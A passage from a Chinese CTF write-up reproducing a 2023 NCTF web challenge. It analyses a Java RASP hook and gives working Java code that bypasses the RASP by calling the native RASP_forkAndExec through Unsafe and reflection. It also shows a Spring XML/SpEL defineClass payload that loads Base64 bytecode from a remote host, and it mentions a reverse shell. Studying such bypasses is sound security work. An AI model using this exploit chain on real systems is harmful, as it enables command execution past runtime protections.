class="line">                    <span class="built_in">this</span>.raspTransform(ctClass, ctBehavior);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ctClass.detach();</span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">            var13.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/hookdebug.png" class="">

<p>当输出第二个Found target class时premain就算结束了</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/kalihook.png" class="">

<p>输出test2时就已经进入test.jar的main方法了，这个时候会继续执行上面那个<code>transform</code>方法对test.jar的调用的方法进行检测，当检测到<code>java.lang.ProcessImpl</code>时，<code>exec</code>被检测为恶意方法，抛出错误，这里当时挺诧异的，明明要匹配的时<code>java.lang.UNIXProcess</code>，但是<code>java.lang.ProcessImpl</code>也被判为恶意，后来参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/121438079">这里</a>，说那两个类在JDK9之后就合并了，等同于一个，所以这样就说得通了</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/unix.png" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/unxierr.png" class="">

<p>到这里rasp的机制就大概清楚了，下面看看如何绕过，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/16780056.html">UnSafe反射方式绕过</a>写出如下测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = s.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>,</span><br><span class="line">                result, <span class="number">0</span>,</span><br><span class="line">                bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argss)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String[] strs=&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">        <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span>      <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] envc                 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds              = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span>      <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject      = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;finished&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里调用了forkAndExec所以会被检测到，参考这篇<a target="_blank" rel="noopener" href="https://www.jrasp.com/guide/technology/native_method.html">hooknative</a>，我们试试去调用rasp创建的新native方法<code>RASP_forkAndExec</code>，这次就可以了</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/poctest2.png" class="">

<p>那么如何把这么长的payload加载到spel当中呢，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gk0d/p/16880749.html">字节码defineclass</a>和<a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">spel内存马</a>，我们先获取payload的base64字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassEncode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.class&quot;</span>);</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">            in.read(data);</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">shellStr</span> <span class="operator">=</span> Base64Utils.encodeToString(data);</span><br><span class="line">        System.out.println(shellStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后先本地load spring xml测试，这里要把上面的payload的static void main方法换成test方法，不然会报错</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XmlLodeClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPathXmlApplicationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://10.0.0.127:9090/test.xml&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;data&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>payload<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;com.test.test&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;your base64&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = s.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>,</span><br><span class="line">                result, <span class="number">0</span>,</span><br><span class="line">                bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String[] strs = &#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">        <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] envc = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;RASP_forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(baos.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;finished&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后用rasp hook运行也是可以的</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/payload.png" class="">

<p>最后在容器尝试反弹shell</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/success.png" class="">

